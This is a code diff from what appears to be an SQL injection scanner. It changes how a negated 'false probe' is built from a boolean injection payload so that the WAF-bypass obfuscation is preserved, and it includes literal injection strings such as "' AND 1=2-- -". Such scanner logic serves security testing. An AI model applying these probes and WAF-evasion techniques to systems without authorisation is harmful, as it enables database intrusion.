         # injections with an empty false_payload return (False, 0.0) — false negative on every
         # detection where _make_false_payload() couldn't derive a negated variant.
         if not false_payload:
-            # FIX-K: Instead of hard-rejecting, derive a generic false probe.
-            # WAFBypass / Novel / Exotic payloads often have complex boolean
-            # expressions that _make_false_payload() cannot negate.
-            # Use a simple always-false tautology so L1/L2/L3 still run.
+            # FIX-K: Instead of hard-rejecting, derive a false probe that mirrors the
+            # WAF-bypass structure of the true payload.
+            # BUG-FIXK-WAF-BLOCKED FIX (HIGH): The original FIX-K generated a bare
+            # " AND 1=2-- -" or "' AND 1=2-- -" which the WAF blocks (no bypass
+            # obfuscation). The blocked false probe returns 0B/400, matching the
+            # baseline, which inverts polarity in WelchConfirmer and causes rejection.
+            # Fix: prefer to negate a recognizable boolean condition in the true payload
+            # by replacing the truism with a falsism; fall back to bare AND only when
+            # no recognizable condition is found.
             _tp_u = (true_payload or '').upper()
-            if "'" in (true_payload or ''):
-                # String-context injection (payload has single quote)
-                false_payload = "' AND 1=2-- -"
-            else:
-                # Numeric-context injection
-                false_payload = " AND 1=2-- -"
-            LOG.debug('[FP-Guards] FIX-K: derived generic false probe for empty false_payload: '
-                      f'{false_payload!r}')
+            # Try to find a negatable numeric truism in the payload and replace it
+            _fixk_negated = False
+            for _pat_t, _rep_f in [
+                (r'\b1\s*=\s*1\b', '1=2'),
+                (r'\b2\s*=\s*2\b', '2=3'),
+                (r'\bTRUE\b', 'FALSE'),
+                (r'\b1\s*>\s*0\b', '0>1'),
+                (r'\b2\s*>\s*1\b', '1>2'),
+            ]:
+                _m_fix = _re.search(_pat_t, true_payload or '', _re.I)
+                if _m_fix:
+                    false_payload = (true_payload or '')[:_m_fix.start()] + _rep_f + (true_payload or '')[_m_fix.end():]
+                    _fixk_negated = True
+                    LOG.debug('[FP-Guards] FIX-K: derived false probe by negating %r → %r',
+                              _m_fix.group(0), _rep_f)
+                    break
+            if not _fixk_negated:
+                # Payload has no simple negatable condition (complex obfuscated ST payload):
+                # fall back to bare AND 1=2 as last resort.
+                if "'" in (true_payload or ''):
+                    false_payload = "' AND 1=2-- -"
+                else:
+                    false_payload = " AND 1=2-- -"
+                LOG.debug('[FP-Guards] FIX-K: fallback generic false probe: %r', false_payload)
 
         # FIX-FPGUARD-TIMING-XCAT (REQ 3/12): Cross-category timing shortcut.
         # When ALL-category dispatch tests a Timebased payload through the Boolean oracle,
